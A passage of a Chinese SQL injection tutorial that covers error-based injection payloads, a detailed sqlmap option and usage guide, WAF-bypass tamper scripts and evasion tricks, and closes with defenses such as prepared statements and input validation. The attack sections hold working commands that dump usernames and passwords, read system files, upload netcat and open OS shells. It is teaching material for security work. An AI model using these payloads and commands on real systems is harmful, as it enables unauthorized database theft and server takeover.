![3281fa73e3820cb747ff753f676e138](https://gitee.com/zh0y0/picture/raw/master/zh0y0/3281fa73e3820cb747ff753f676e138.png)

###### 4.使用报错函数进行注入

```
1' ,2, extractvalue(1,concat(0x5c,(select group_concat(password,username) from users),0x5c)) and '1=1   爆账户密码。
1',2,updatexml (1,concat(0x5c,(select group_concat(username,password) from users),0x5c),1))#   爆账户密码。
```



#### 六、sqlmap

##### 1.简介

SQLMap 是一个**自动化的SQL注入**工具，其主要功能是扫描、发现并利用给定URL的SQL注入漏洞，内置了很多绕过插件，支持的数据库是MySQL 、Oracle 、PostgreSQL 、Microsoft SQL Server、Microsoft Access 、IBM DB2, SQ Lite 、Firebird 、Sybase和SAPMaxDB 。

注意：sqlmap只是用来检测和利用sql注入点，并不能扫描出网站有哪些漏洞，使用前请先使用扫描工具扫出sql注入点。

sqlmap支持五种不同的注入模式：

> -   基于布尔的盲注，即可以根据返回页面判断条件真假的注入；
>
> -   基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断；
>
> -   基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中；
>
> -   联合查询注入，可以使用union的情况下的注入；
>
> -   堆叠查询注入，可以同时执行多条语句的执行时的注入。

##### 2.下载及安装

项目地址： https://github.com/sqlmapproject

##### 3. SQL使用参数详解

###### 3.1 选项

```
 -h,–help  显示基本帮助信息并退出

 -hh    显示高级帮助信息并退出

 –version  显示程序版本信息并退出

-vVERBOSE信息级别: 0-6 （缺省1），其值具体含义：“0”只显示python错误以及严重的信息；1同时显示基本信息和警告信息（默认）；“2”同时显示debug信息；“3”同时显示注入的payload；“4”同时显示HTTP请求；“5”同时显示HTTP响应头；“6”同时显示HTTP响应页面；如果想看到sqlmap发送的测试payload最好的等级就是3。
```

###### 3.2目标

在这些选项中必须提供至少有一个确定目标

```
-d DIRECT    直接连接数据库的连接字符串

-u URL, –url=URL   目标URL (e.g.”http://www.site.com/vuln.php?id=1“)，使用-u或者–url

-l LOGFILE     从Burp或者WebScarab代理日志文件中分析目标

-x SITEMAPURL  从远程网站地图（sitemap.xml）文件来解析目标

-m BULKFILE      将目标地址保存在文件中，一行为一个URL地址进行批量检测。

-r REQUESTFILE   从文件加载HTTP请求，sqlmap可以从一个文本文件中获取HTTP请求，这样就可以跳过设置一些其他参数（比如cookie，POST数据，等等），请求是HTTPS的时需要配合这个–force-ssl参数来使用，或者可以在Host头后门加上:443

-g GOOGLEDORK     从谷歌中加载结果目标URL（只获取前100个结果，需要挂代理）

-c CONFIGFILE       从配置ini文件中加载选项

```

###### 3.3 请求

这些选项可以用来指定如何连接到目标URL

```
	–method=METHOD  强制使用给定的HTTP方法（例如put）

	--data=DATA   通过POST发送数据参数，sqlmap会像检测GET参数一样检测POST的参数。--data="id=1" -f --banner --dbs --users

   –param-del=PARA..  当GET或POST的数据需要用其他字符分割测试参数的时候需要用到此参数。

   –cookie=COOKIE     HTTP Cookieheader 值

   –cookie-del=COO..  用来分隔cookie的字符串值

   –load-cookies=L..  Filecontaining cookies in Netscape/wget format

   –drop-set-cookie   IgnoreSet-Cookie header from response

   –user-agent=AGENT  默认情况下sqlmap的HTTP请求头中User-Agent值是：sqlmap/1.0-dev-xxxxxxx(http://sqlmap.org)可以使用–user-agent参数来修改，同时也可以使用–random-agent参数来随机的从./txt/user-agents.txt中获取。当–level参数设定为3或者3以上的时候，会尝试对User-Angent进行注入

   ※ –random-agent     使用random-agent作为HTTP User-Agent头值

   –host=HOST         HTTP Hostheader value

   –referer=REFERER   sqlmap可以在请求中伪造HTTP中的referer，当–level参数设定为3或者3以上的时候会尝试对referer注入

   -H HEADER, –hea..  额外的http头(e.g.”X-Forwarded-For: 127.0.0.1″)

   –headers=HEADERS  可以通过–headers参数来增加额外的http头(e.g.”Accept-Language: fr\nETag: 123″)

   –auth-type=AUTH.. HTTP的认证类型 (Basic, Digest, NTLM or PKI)

   –auth-cred=AUTH..  HTTP 认证凭证(name:password)

   –auth-file=AUTH..  HTTP 认证PEM证书/私钥文件；当Web服务器需要客户端证书进行身份验证时，需要提供两个文件:key_file，cert_file,key_file是格式为PEM文件，包含着你的私钥，cert_file是格式为PEM的连接文件。

   –ignore-401        Ignore HTTPError 401 (Unauthorized)忽略HTTP 401错误（未授权的）

   –ignore-proxy      忽略系统的默认代理设置

   –ignore-redirects忽略重定向的尝试

   –ignore-timeouts   忽略连接超时

   –proxy=PROXY       使用代理服务器连接到目标URL

   –proxy-cred=PRO..  代理认证凭证(name:password)

   –proxy-file=PRO..  从文件加载代理列表

   –tor               使用Tor匿名网络

   –tor-port=TORPORT  设置Tor代理端口

   –tor-type=TORTYPE  设置Tor代理类型 (HTTP,SOCKS4 or SOCKS5 (缺省))

   –check-tor       检查Tor的是否正确使用

   –delay=DELAY   可以设定两个HTTP(S)请求间的延迟，设定为0.5的时候是半秒，默认是没有延迟的。

   –timeout=TIMEOUT   可以设定一个HTTP(S)请求超过多久判定为超时，10表示10秒，默认是30秒。

   –retries=RETRIES   当HTTP(S)超时时，可以设定重新尝试连接次数，默认是3次。

   –randomize=RPARAM可以设定某一个参数值在每一次请求中随机的变化，长度和类型会与提供的初始值一样

   –safe-url=SAFEURL  提供一个安全不错误的连接，每隔一段时间都会去访问一下

   –safe-post=SAFE..  提供一个安全不错误的连接，每次测试请求之后都会再访问一遍安全连接。

   –safe-req=SAFER..  从文件中加载安全HTTP请求

   –safe-freq=SAFE..  测试一个给定安全网址的两个访问请求

   –skip-urlencode    跳过URL的有效载荷数据编码

   –csrf-token=CSR..  Parameter usedto hold anti-CSRF token参数用来保存反CSRF令牌

   –csrf-url=CSRFURL  URL地址访问提取anti-CSRF令牌

   –force-ssl         强制使用SSL/HTTPS

   –hpp               使用HTTP参数污染的方法
```

###### 3.4 优化

这些选项可用于优化sqlmap性能

```
-o               打开所有的优化开关

–predict-output    预测普通查询输出

–keep-alive        使用持久HTTP（S）连接

–null-connection   获取页面长度

–threads=THREADS   当前http(s)最大请求数 (默认 1)
```

###### 3.5 注入

这些选项可用于指定要测试的参数、提供自定义注入有效载荷和可选的篡改脚本。

```
   ※ -p TESTPARAMETER    可测试的参数

   –skip=SKIP         跳过对给定参数的测试

   –skip-static       跳过测试不显示为动态的参数

   –param-exclude=..  使用正则表达式排除参数进行测试（e.g. “ses”）

   –dbms=DBMS         强制后端的DBMS为此值

   –dbms-cred=DBMS..  DBMS认证凭证(user:password)

   –os=OS            强制后端的DBMS操作系统为这个值

   –invalid-bignum    使用大数字使值无效

   –invalid-logical   使用逻辑操作使值无效

   –invalid-string    使用随机字符串使值无效

   –no-cast          关闭有效载荷铸造机制

   –no-escape         关闭字符串逃逸机制

   –prefix=PREFIX     注入payload字符串前缀

   –suffix=SUFFIX     注入payload字符串后缀

   ※ –tamper=TAMPER   使用给定的脚本篡改注入数据
```

###### 3.6 检测

这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容

```
   –level=LEVEL     执行测试的等级（1-5，默认为1）

   –risk=RISK       执行测试的风险（0-3，默认为1）

   –string=STRING    查询时有效时在页面匹配字符串

   –not-string=NOT..  当查询求值为无效时匹配的字符串

   –regexp=REGEXP     查询时有效时在页面匹配正则表达式

   –code=CODE       当查询求值为True时匹配的HTTP代码

   –text-only        仅基于在文本内容比较网页

   –titles           仅根据他们的标题进行比较
```

###### 3.7 技巧

这些选项可用于调整具体的SQL注入测试

```
   ※ –technique=T    SQL注入技术测试（默认BEUST）

   –time-sec=TIMESEC  DBMS响应的延迟时间（默认为5秒）

   –union-cols=UCOLS  定列范围用于测试UNION查询注入

   –union-char=UCHAR  暴力猜测列的字符数

   –union-from=UFROM  SQL注入UNION查询使用的格式

   –dns-domain=DNS..  DNS泄露攻击使用的域名

   –second-order=S..  URL搜索产生的结果页面
```

###### 3.8 指纹

```
-f, –fingerprint   执行广泛的DBMS版本指纹检查
```

###### 3.9 枚举

这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行自定义的SQL语句。

  

```
   -a, –all           获取所有信息

   -b, –banner        获取数据库管理系统的标识

   –current-user      获取数据库管理系统当前用户

   –current-db        获取数据库管理系统当前数据库

    –hostname         获取数据库服务器的主机名称

   –is-dba            检测DBMS当前用户是否DBA

   –users             枚举数据库管理系统用户

   –passwords         枚举数据库管理系统用户密码哈希

   –privileges        枚举数据库管理系统用户的权限

   –roles            枚举数据库管理系统用户的角色

   --dbs             枚举数据库管理系统数据库

   --tables            枚举的DBMS数据库中的表

   --columns          枚举DBMS数据库表列

   –schema            枚举数据库架构

   –count             检索表的项目数，有时候用户只想获取表中的数据个数而不是具体的内容，那么就可以使用这个参数：sqlmap.py -u url –count -D testdb

   --dump            转储数据库表项

   –dump-all          转储数据库所有表项

   –search           搜索列（S），表（S）和/或数据库名称（S）

   –comments          获取DBMS注释

   -D DB               要进行枚举的指定数据库名

   -T TBL              DBMS数据库表枚举

   -C COL             DBMS数据库表列枚举

   -X EXCLUDECOL     DBMS数据库表不进行枚举

   -U USER           用来进行枚举的数据库用户

   –exclude-sysdbs    枚举表时排除系统数据库

   –pivot-column=P..  Pivot columnname

   –where=DUMPWHERE   Use WHEREcondition while table dumping

   –start=LIMITSTART  获取第一个查询输出数据位置

   –stop=LIMITSTOP   获取最后查询的输出数据

   –first=FIRSTCHAR   第一个查询输出字的字符获取

   –last=LASTCHAR    最后查询的输出字字符获取

   –sql-query=QUERY   要执行的SQL语句

   –sql-shell         提示交互式SQL的shell

   –sql-file=SQLFILE  要执行的SQL文件
```

###### 3.10 暴力

这些选项可以被用来运行暴力检查

```
   –common-tables     检查存在共同表

   –common-columns    检查存在共同列
```

###### 3.11 用户自定义函数注入

这些选项可以用来创建用户自定义函数

  

```
   –udf-inject    注入用户自定义函数

   –shared-lib=SHLIB  共享库的本地路径
```

###### 3.12 访问文件系统

这些选项可以被用来访问后端数据库管理系统的底层文件系统

```
   –file-read=RFILE   从后端的数据库管理系统文件系统读取文件，SQL Server2005中读取二进制文件example.exe:

sqlmap.py -u”http://192.168.136.129/sqlmap/mssql/iis/get_str2.asp?name=luther“–file-read “C:/example.exe” -v 1

   –file-write=WFILE  编辑后端的数据库管理系统文件系统上的本地文件

   –file-dest=DFILE   后端的数据库管理系统写入文件的绝对路径

在kali中将/software/nc.exe文件上传到C:/WINDOWS/Temp下：

python sqlmap.py -u”http://192.168.136.129/sqlmap/mysql/get_int.aspx?id=1” –file-write”/software/nc.exe” –file-dest “C:/WINDOWS/Temp/nc.exe” -v1
```

###### 3.13 操作系统访问

这些选项可以用于访问后端数据库管理系统的底层操作系统

```
   –os-cmd=OSCMD   执行操作系统命令（OSCMD）

   –os-shell          交互式的操作系统的shell

   –os-pwn          获取一个OOB shell，meterpreter或VNC

   –os-smbrelay       一键获取一个OOBshell，meterpreter或VNC

   –os-bof           存储过程缓冲区溢出利用

   –priv-esc          数据库进程用户权限提升

   –msf-path=MSFPATH  MetasploitFramework本地的安装路径

   –tmp-path=TMPPATH  远程临时文件目录的绝对路径
```

linux查看当前用户命令：

sqlmap.py -u”http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1” –os-cmd id -v1

###### 3.14 Windows注册表访问

这些选项可以被用来访问后端数据库管理系统Windows注册表

   

```
–reg-read          读一个Windows注册表项值

   –reg-add           写一个Windows注册表项值数据

   –reg-del           删除Windows注册表键值

   –reg-key=REGKEY    Windows注册表键

   –reg-value=REGVAL  Windows注册表项值

   –reg-data=REGDATA  Windows注册表键值数据

   –reg-type=REGTYPE  Windows注册表项值类型
```

###### 3.15 一般选项

这些选项可以用来设置一些一般的工作参数

   

```
   -s SESSIONFILE     保存和恢复检索会话文件的所有数据

   -t TRAFFICFILE      记录所有HTTP流量到一个文本文件中

   ※ –-batch            从不询问用户输入，使用所有默认配置。

   –binary-fields=..  结果字段具有二进制值(e.g.”digest”)

   –charset=CHARSET   强制字符编码

   –crawl=CRAWLDEPTH  从目标URL爬行网站

   –crawl-exclude=..  正则表达式从爬行页中排除

   –csv-del=CSVDEL    限定使用CSV输出 (default”,”)

   –dump-format=DU..  转储数据格式(CSV(default), HTML or SQLITE)

   –eta              显示每个输出的预计到达时间

   ※ –flush-session     刷新当前目标的会话文件

   –forms           解析和测试目标URL表单

    –fresh-queries     忽略在会话文件中存储的查询结果

   –hex             使用DBMS Hex函数数据检索

   –output-dir=OUT..  自定义输出目录路径

   –parse-errors      解析和显示响应数据库错误信息

   –save=SAVECONFIG   保存选项到INI配置文件

   –scope=SCOPE    从提供的代理日志中使用正则表达式过滤目标

   –test-filter=TE..  选择测试的有效载荷和/或标题(e.g. ROW)

   –test-skip=TEST..  跳过试验载荷和/或标题(e.g.BENCHMARK)

   –update            更新sqlmap
```

###### 3.16 其他

 

```
  -z MNEMONICS        使用短记忆法 (e.g.”flu,bat,ban,tec=EU”)

   –alert=ALERT       发现SQL注入时，运行主机操作系统命令

   –answers=ANSWERS   当希望sqlmap提出输入时，自动输入自己想要的答案(e.g. “quit=N,follow=N”)，例如：sqlmap.py -u”http://192.168.22.128/get_int.php?id=1“–technique=E–answers=”extending=N” –batch

   –beep    发现sql注入时，发出蜂鸣声。

   –cleanup     清除sqlmap注入时在DBMS中产生的udf与表。

   –dependencies      Check formissing (non-core) sqlmap dependencies

   –disable-coloring  默认彩色输出，禁掉彩色输出。

   –gpage=GOOGLEPAGE 使用前100个URL地址作为注入测试，结合此选项，可以指定页面的URL测试

   –identify-waf      进行WAF/IPS/IDS保护测试，目前大约支持30种产品的识别

   –mobile     有时服务端只接收移动端的访问，此时可以设定一个手机的User-Agent来模仿手机登陆。

   –offline           Work inoffline mode (only use session data)

   –purge-output     从输出目录安全删除所有内容，有时需要删除结果文件，而不被恢复，可以使用此参数，原有文件将会被随机的一些文件覆盖。

   –skip-waf           跳过WAF／IPS / IDS启发式检测保护

   –smart            进行积极的启发式测试，快速判断为注入的报错点进行注入

   –sqlmap-shell      互动提示一个sqlmapshell

   –tmp-dir=TMPDIR    用于存储临时文件的本地目录

   –web-root=WEBROOT  Web服务器的文档根目录(e.g.”/var/www”)

   –wizard   新手用户简单的向导使用，可以一步一步教你如何输入针对目标注入
```

##### 4.实际利用

###### 4.1 抓取POST请求方法的参数数据包

![18176b60cf7753989f8d691f91a3575](https://gitee.com/zh0y0/picture/raw/master/zh0y0/18176b60cf7753989f8d691f91a3575.png)

###### 4.2复制数据包内容至sqlma文件目录下

我们把这个内容保存到SQLMAP根目录下的一个txt文件内，我这里是1.txt

![e9bbc86285c0b782d276ec193ba96bd](https://gitee.com/zh0y0/picture/raw/master/zh0y0/e9bbc86285c0b782d276ec193ba96bd.png)

###### 4.3 判断是否为注入点

```
python sqlmap.py -r 1.txt --batch
--batch   默认选择
```

![094cba306075e566d01682914cd518c](https://gitee.com/zh0y0/picture/raw/master/zh0y0/094cba306075e566d01682914cd518c.png)

###### 4.4 爆数据库名

```
python sqlmap.py -r 1.txt --dbs --batch
--dbs  列出所有数据库
```

![76613dea0a1a918f85e25e36a54e170](https://gitee.com/zh0y0/picture/raw/master/zh0y0/76613dea0a1a918f85e25e36a54e170.png)

###### 4.5 爆表名

```
python sqlmap.py -r 1.txt --batch -D security --tables
-D 指定数据库
--tables  列出表名
```

![05bb2a34f8c7bc0c85c0405a840b2a0](https://gitee.com/zh0y0/picture/raw/master/zh0y0/05bb2a34f8c7bc0c85c0405a840b2a0.png)

###### 4.6 爆字段名

```
python38 sqlmap.py -r 1.txt --batch -D security -T users --columns
-T 指定表
--columns 列出列名
```

![5f5253e98efaba338101949c88f51de](https://gitee.com/zh0y0/picture/raw/master/zh0y0/5f5253e98efaba338101949c88f51de.png)

###### 4.7 爆数据

```
python38 sqlmap.py -r 1.txt --batch -D security -T users -C username,password --dump
-C 指定字段
--dump 输出字段值
```

![11444fb566eec3e24d3cc3318bb393c](https://gitee.com/zh0y0/picture/raw/master/zh0y0/11444fb566eec3e24d3cc3318bb393c.png)

##### 5.攻击技巧

###### 5.1waf绕过

`--tamper` 指定绕过脚本，绕过WAF或ids等。

```
sqlmap -u 'http://xx/?id=1' --tamper 'space2comment.py'
```

tamper文件解释

```
space2comment.py用/**/代替空格

apostrophemask.py用utf8代替引号

equaltolike.pylike代替等号

space2dash.py　绕过过滤‘=’ 替换空格字符（”），（’–‘）后跟一个破折号注释，一个随机字符串和一个新行（’n’）

greatest.py　绕过过滤’>’ ,用GREATEST替换大于号。

space2hash.py空格替换为#号,随机字符串以及换行符

apostrophenullencode.py绕过过滤双引号，替换字符和双引号。

halfversionedmorekeywords.py当数据库为mysql时绕过防火墙，每个关键字之前添加mysql版本评论

space2morehash.py空格替换为 #号 以及更多随机字符串 换行符

appendnullbyte.py在有效负荷结束位置加载零字节字符编码

ifnull2ifisnull.py　绕过对IFNULL过滤,替换类似’IFNULL(A,B)’为’IF(ISNULL(A), B, A)’

space2mssqlblank.py(mssql)空格替换为其它空符号

base64encode.py　用base64编码替换

space2mssqlhash.py　替换空格

modsecurityversioned.py过滤空格，包含完整的查询版本注释

space2mysqlblank.py　空格替换其它空白符号(mysql)

between.py用between替换大于号（>）

space2mysqldash.py替换空格字符（”）（’ – ‘）后跟一个破折号注释一个新行（’ n’）

multiplespaces.py围绕SQL关键字添加多个空格

space2plus.py用+替换空格

bluecoat.py代替空格字符后与一个有效的随机空白字符的SQL语句,然后替换=为like

nonrecursivereplacement.py双重查询语句,取代SQL关键字

space2randomblank.py代替空格字符（“”）从一个随机的空白字符可选字符的有效集

sp_password.py追加sp_password’从DBMS日志的自动模糊处理的有效载荷的末尾

chardoubleencode.py双url编码(不处理以编码的)

unionalltounion.py替换UNION ALLSELECT UNION SELECT

charencode.py　url编码

randomcase.py随机大小写

unmagicquotes.py宽字符绕过 GPCaddslashes

randomcomments.py用/**/分割sql关键字

charunicodeencode.py字符串 unicode 编码

securesphere.py追加特制的字符串

versionedmorekeywords.py注释绕过

space2comment.py替换空格字符串(‘‘) 使用注释‘/**/’

halfversionedmorekeywords.py关键字前加注释
```

###### 2.获取当前数据库的用户名称 

```
python sqlmap.py -r d:\1.txt --current-user --batch
```

###### 3.获取当前网站所用的数据库库名

```
python sqlmap.py -r d:\1.txt --current-db --batch
```

###### 4.获取表中的数据个数

```
sqlmap.py -u”” –count -D testdb
```

###### 5.获取当前数据库的用户密码

```
python sqlmap.py -r d:\1.txt --passwords --batch
```

###### 6.基于布尔SQL注入预估时间

```
sqlmap.py -u ““-b –eta
```

###### 7.刷新缓存

```
python sqlmap.py -r d:\1.txt -p "username" --batch  --flush-session
如果希望在第二次扫描时重新进行SQLMAP扫描，而不是直接从缓存中拿数据，此时可以加此参数 
```

###### 8.结合burpsuite进行注入

（1）burpsuite抓包，需要设置burpsuite记录请求日志

```
sqlmap.py -r burpsuite抓包.txt
```

（2）指定表单注入

```
sqlmap.py -u URL –data“username=a&password=a”
```

###### 9.sqlmap自动填写表单注入

自动填写表单：

```
sqlmap.py -u URL –forms

sqlmap.py -u URL –forms –dbs

sqlmap.py -u URL –forms –current-db

sqlmap.py -u URL –forms -D 数据库名称–tables

sqlmap.py -u URL –forms -D 数据库名称 -T 表名 –columns

sqlmap.py -u URL –forms -D 数据库名称 -T 表名 -Cusername，password –dump
```

###### 10.读取linux下文件

```
sqlmap.py-u “url” –file /etc/password
```

###### 11.延时注入

```
sqlmap.py -u URL –technique -T –current-user
```

###### 12.sqlmap 结合burpsuite进行post注入

结合burpsuite来使用sqlmap：

（1）浏览器打开目标地址

（2）配置burp代理(127.0.0.1:8080)以拦截请求

（3）点击登录表单的submit按钮

（4）Burp会拦截到了我们的登录POST请求

（5）把这个post请求复制为txt, 我这命名为post.txt 然后把它放至sqlmap目录下

（6）运行sqlmap并使用如下命令：

```
python sqlmap.py -r post.txt -p tfUPass
```

###### 13.sqlmap cookies注入

```
sqlmap.py -u ““–cookies “id=1″  –dbs –level 2
```

默认情况下SQLMAP只支持GET/POST参数的注入测试，但是当使用–level 参数且数值>=2的时候也会检查cookie里面的参数，当>=3的时候将检查User-agent和Referer。可以通过burpsuite等工具获取当前的cookie值，然后进行注入：

```
sqlmap.py -u 注入点URL --cookie"id=xx" --level 3

sqlmap.py -u url --cookie "id=xx"--level 3 --tables(猜表名)

sqlmap.py -u url --cookie "id=xx"--level 3 -T 表名 --coiumns

sqlmap.py -u url --cookie "id=xx"--level 3 -T 表名 -C username，password --dump
```

###### 14.执行shell命令

```
sqlmap.py -u “url” –os-cmd=”netuser” /*执行net user命令*/

sqlmap.py -u “url” –os-shell /*系统交互的shell*/
```

###### 15.延时注入时间设置

```
sqlmap –dbs -u"url" –delay 0.5 /*延时0.5秒*/
```

#### 七、SQL注入的绕过方法

##### 1.大小写绕过

##### 2.替换关键字绕过

###### 2.1 关键词双写

###### 2.2 同价词替换

WAF主要针对一些特殊的关键词进行检测，可以使用具有相似功能的符号或者函数来替换，常见的用法：

- 不能使用and或or时，使用 && 或 || 代替
- 不能使用 = 时，使用 < > 代替
- 不能使用空格时，使用%20 %09 %0a %0b %0c %0d %a0 代替空格

###### 2.3 特殊字符拼接

##### 3.使用sqlmap绕过waf

sqlmap发出的数据包再默认情况下不会被处理，可能会被服务器的拦截规则“pass”,这种情况可以考虑使用参数”tamper”。

#### 八、防御方法

##### 1.使用预编译语句

SQL 注入一般都是 SQL 语句拼接造成的，因为这个过程导致 SQL 语句结构发生了改变,如果我们能把 SQL 语句的结构固定下来，仅填充可变的数据部分，就可以避免 SQL 注入。这个预先定义的 SQL 语句叫预编译语句(Prepared Statement)，这种査询方法也叫参数化查询(Parameterized Query)。不同的语言都有相应的预编译语句的方法。下面是在PHP中使用预编译语句的示例:

```php
/*Prepared statement,stage 1:prepare */
$stmt = $mysqli->prepare("INSERT INTO test(id, label)VALUES (?,?");
/*Prepared statement,stage 2: bind and execute */

$id =1;

$label ='PHP';
$stmt->bind_param("is",$id,$label);//"is" means that $id is bound as an integer and $label as a string
$stmt->execute();
```

SQL语句中仅数据部分可以使用参数绑定，而表名、列名本身属于 SOL语句结构的一部分，它们是不能使用参数绑定的。而在应用中根据用户提交的列名参数来排序是常见的功能，所以 ORDER BY语句很容易产生 SQL注入，需要特别注意。我们可以用后文讲到的参数校验方式来保证其安全。

使用预编译语句不仅可以防止 SQL 注入，而且还能提升数据库性能，因为 SQL 语句的结构固定，数据库将它编译后会缓存起来，下次查询时无须再编译，从而获得更好的性能。

一般来说，防御 SQL注入的最佳方式，就是使用预编译语句，绑定参数查询。但是不正确地使用预编译语句还是会造成安全问题，如果把外部输入的变量用于生成预编译语句，相当于SQL语句的结构受外部输入控制，还是会存在 SQL 注入。

##### 2.参数校验

大部分情况下，使用预编译语句或存储过程就可以解决 SQL注入问题，但有少数场景无法使用预编译语句，我们只能回到输入过滤和编码等方法上来。

检查输入数据的数据类型，在很大程度上可以对抗 SQL注入。比如，下面这段代码限制了输入数据的类型只能为 integer，或者对输入变量强制类型转换，在这种情况下，也是无法注入成功的:

```php
<?php

settype($offset,'integer');
// $offset = intval($offset);
$query= "SELECT id, name FRoM products ORDER BY name LIMIT 20 OFFSET $offset;";
$query= sprintf("SELEcT id, name FRoM products ORDER BY name LIMIT 20 OFFSET %d ;", $offset);

?>
```

对其他的数据格式做类型检査也是有益的。比如，严格按照邮箱的格式输入邮箱信息，严格按照时间和日期的格式输入时间和日期数据等，都能避免用户输入的数据造成破坏。还有一些应用场景中查询的列名是用户参数可控的,或者 ORDER BY 的字段名是用户提交的,这时应当使用列名的白名单，对输入的参数做严格的校验。

但数据类型检查并非万能的，如果就是需要用户提交字符串，比如一段短文，则应该依赖其他的方法防范 SQL 注入

##### 3. 使用安全函数

在有些场景中可能使用简单的 SQL语句拼接会更方便，比如 Where 条件的个数不固定时一般来说，各种 Web 编程语言都实现了一些编码函数，可以帮助对抗 SQL 注入。但前面也列举了一些编码函数被绕过的例子，因此我们还是需要格外小心。要参考官方文档使用正确的函数做 SQL 转义;同时，要注意字符集和编码，比如 PHP 中不要简单使用 addslashes()函数做转义，而是用标准的 mysqli_real_escape_string 函数,并且尽量在整个应用中使用统一的字符编码些 Web 开发框架使用了数据访问对象(DatabaseAccess Objects，DAO)来操作数据库开发者可以使用面向对象的 API来操作数据，底层会自动构造相应的 SQL语句来访问数据库即使查询条件不固定，也能程序化地构造 SQL 语句.
